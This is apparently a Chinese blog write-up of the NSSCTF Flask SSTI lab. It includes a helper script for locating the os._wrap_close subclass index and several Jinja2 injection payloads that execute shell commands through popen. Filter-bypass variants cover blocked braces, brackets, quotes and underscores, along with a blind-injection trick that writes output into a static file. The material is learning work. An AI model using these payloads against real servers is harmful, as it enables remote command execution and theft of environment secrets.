---
title: SSTI 漏洞
description: 学习一下SSTI漏洞
date: 2026-07-14 08:48:45
updated: 2026-07-14 08:48:45
image: /2026/SSTI 漏洞/cover.jpg
categories: [技术]
---

## SSTI 漏洞介绍

SSTI（Server-Side Template Injection）是一种服务器端模板注入漏洞，发生在应用程序使用模板引擎渲染用户输入时未能正确过滤或转义用户提供的内容。比如在`python的flask`、`php的tp`、`java的spring`等框架中都可能存在。

## Flask SSTI lab

这里先用基于 Flask 框架的SSTI lab进行学习， 直接用https://www.nssctf.cn/problem/13。

### 1.  `no waf`

没有过滤，先找下`os._wrap_close`类是第几个，用下面的脚本。

```python
#!/usr/bin/env python3
"""从 subclasses 输出中找指定类的索引 — 把 dump 结果直接贴到 RAW 变量里即可"""

RAW = """\
..................."""

TARGET = "os._wrap_close"   # 改成你要找的类名，不用带 class '...' 包裹

# --- 下面不用动 ---
content = RAW.strip()

# 去掉可能的前缀（如 SSTI 回显的 "Hello "）
if not content.startswith("["):
    bracket = content.find("[")
    if bracket != -1:
        content = content[bracket:]

# 去外层 []
if content.startswith("["):
    content = content[1:]
if content.endswith("]"):
    content = content[:-1]

# 按 ", " 分割
classes = [c.strip() for c in content.split(", ")]

# 搜目标
target_full = f"class '{TARGET}'"
for i, c in enumerate(classes):
    if c == target_full:
        print(f"[+] 找到 {target_full}")
        print(f"    索引: {i}")
        print(f"    Payload: {{}}.__class__.__base__.__subclasses__()[{i}]")
        break
    elif TARGET in c:
        print(f"[+] 模糊匹配到包含 '{TARGET}' 的项:")
        print(f"    索引 {i}: {c}")
else:
    print(f"[-] 未精确匹配 '{TARGET}'，模糊搜索结果:")
    for i, c in enumerate(classes):
        if TARGET.lower() in c.lower():
            print(f"    [{i}] {c}")

```

找到后用这个payload  `{{"".__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['popen']('env').read()}}` 即可。

除此之外，这里发现一位师傅的，可以直接用 lipsum 内置函数。

EXP  `{{lipsum.__globals__['os'].popen('env').read()}}`



### 2.  `{   {`

禁了`{`，可以用`{% print %}`等价绕过。

```python
{% %}可以用来声明变量，当然也可以用于循环语句和条件语句。

{{ }}用于将表达式打印到模板输出

{# #}表示未包含在模板输出中的注释

```

EXP    `{%print lipsum.__globals__['os'].popen('env').read()%}`



### 3.  `no waf and blind`

这道题是盲注，并且是不出网的，选择把输出写入 flask 静态目录再访问。

EXP  

```python
{{lipsum.__globals__['os'].popen('echo `env` >/app/static/1.txt').read()}}
```



### 4.  `[  ]`

禁了`[ ]`，替换一下。

```python
dict['__builtins__']
dict.__getitem__('__builtins__')
dict.pop('__builtins__')
dict.get('__builtins__')
dict.setdefault('__builtins__')
list[0]
list.__getitem__(0)
list.pop(0)
```

EXP  `{{lipsum.__globals__.pop('os').popen('env').read()}}`



### 5.  `'  "`

禁了`' "`，用表示`request` 绕过。

EXP

```python
1.在post注入
{{lipsum.__globals__[request.form.a1].popen(request.form.a2).read()}}
a1=os&a2=env
2.在get注入
{{lipsum.__globals__[request.args.a1].popen(request.args.a2).read()}}
url : ...?a1=os&a2=env
```



### 6.  `_`

禁了`_`，三种方式绕过。

#### 1.  构造获取

```python
 (()|select|string)得到的字符串里，第 24 个字符正好就是 _ 。
 {{ ()|attr(class) }}  
 # 等同于 {{ ().__class__ }}
 
 EXP
 {% set u = (()|select|string|list).pop(24) %}{% set nss = u ~ u ~ "globals" ~ u ~ u %}{{ (lipsum|attr(nss)).os.popen('env').read() }}
    
 
```

